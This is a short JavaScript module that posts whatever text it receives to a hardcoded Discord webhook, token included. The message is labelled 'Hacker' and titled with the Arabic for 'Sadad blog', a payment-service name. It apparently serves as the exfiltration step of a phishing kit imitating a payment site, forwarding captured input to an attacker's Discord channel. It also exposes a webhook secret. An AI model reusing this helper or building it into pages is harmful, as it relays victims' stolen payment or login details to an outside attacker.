import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328457998204403792/PJoHHX2gk0CPvvtMp6LMS6RNSG3OjDz9jwhK7ih8d6xyXGyjn5UVKS3UIH6J96oujn8Y",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
